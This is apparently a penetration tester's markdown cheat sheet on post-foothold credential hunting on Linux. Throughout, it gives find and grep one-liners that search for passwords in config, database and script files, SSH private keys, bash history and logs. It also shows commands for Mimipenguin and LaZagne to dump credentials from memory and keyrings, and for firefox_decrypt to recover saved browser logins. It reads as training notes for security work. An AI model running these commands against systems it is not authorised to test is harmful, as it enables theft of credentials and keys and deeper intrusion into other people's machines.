***POST FOOTHOLD*** 

Sources for Passwords:

| ==FILES==   | ==HISTORY==          | ==MEMORY==           | ==KEY-RINGS==              |
| ----------- | -------------------- | -------------------- | -------------------------- |
| Configs     | Logs                 | Cache                | Browser stored credentials |
| Databases   | Command-line History | In-memory Processing |                            |
| Notes       |                      |                      |                            |
| Scripts     |                      |                      |                            |
| Source code |                      |                      |                            |
| Cronjobs    |                      |                      |                            |
| SSH Keys    |                      |                      |                            |
## Files
*Everything is a file.*

###### Find configuration files (three common extentions):
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

###### Find credentials in configuration files (.cnf):
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

###### Databases:
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

###### Search for notes (.txt) and no extension files:
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

###### Script files:
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

###### Cronjobs:
```bash
cat /etc/crontab
```

Cron files are located at `/etc/cron.d`
```bash
ls -la /etc/cron.*/
```

###### SSH Keys
```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

## History
*.bash_history, .bashrc, .bash_profile*

###### Bash History
```bash
tail -n5 /home/*/.bash*
```

###### Logs
1. Application Logs
2. Event Logs
3. Service Logs
4. System Logs

|**Log File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|
Find interesting strings in logs:
```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

## Memory and Cache
###### [Mimipenguin](https://github.com/huntergregal/mimipenguin) *Requires root perms*
Makes the process of gathering credentials easier.
```bash
sudo python3 mimipenguin.py
```
```bash
sudo bash mimipenguin.sh
```

[LaZagne](Credential%20Hunting%20in%20Windows): *Python2.7*
Capabilities:

|                |                |           |             |
| -------------- | -------------- | --------- | ----------- |
| Wifi           | Wpa_supplicant | Libsecret | Kwallet     |
| Chromium-based | CLI            | Mozilla   | Thunderbird |
| Git            | Env_variable   | Grub      | Fstab       |
| AWS            | Filezilla      | Gftp      | SSH         |
| Apache         | Shadow         | Docker    | KeePass     |
| Mimipy         | Sessions       | Keyrings  |             |

```bash
sudo python2.7 laZagne.py all
```

###### Browsers
==Firefox== stores credentials in `.mozilla/firefox/***.default-release/logins.json`. These hashes can be viewed with `cat <path>/default-release/logins.json | jq .`

We can then use [Firefox Decrypt](https://github.com/unode/firefox_decrypt) to decrypt said creds. *Requires python 3.9*.

```bash
python3.9 firefox_decrypt.py
```

==LaZagne== can also return results if the browser is supported.
```bash
python3 laZagne.py browsers
```
